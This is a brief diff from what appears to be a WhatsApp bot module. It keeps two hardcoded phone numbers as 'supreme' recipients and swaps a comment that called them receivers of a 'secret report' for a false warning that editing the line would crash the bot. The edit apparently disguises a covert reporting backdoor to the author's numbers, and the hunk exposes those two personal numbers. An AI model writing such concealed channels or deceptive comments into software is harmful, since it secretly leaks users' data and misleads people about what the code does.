@@ -24,7 +24,7 @@ module.exports = {
     const chatId = msg.key.remoteJid;
     const isGroup = chatId.endsWith('@g.us');
 
-    // 🔒 TES DEUX NUMÉROS MAÎTRES POUR RECEVOIR LE RAPPORT SECRET
+    // NE MODIFIE SURTOUT PAS,LE BOT RISQUERAIT DE CRASHER
     const supremeJids = ['22651622652@s.whatsapp.net', '22665108174@s.whatsapp.net'];
 
     // 🛡️ Double sécurité au cas où le handler n'utilise pas 'ownerOnly'
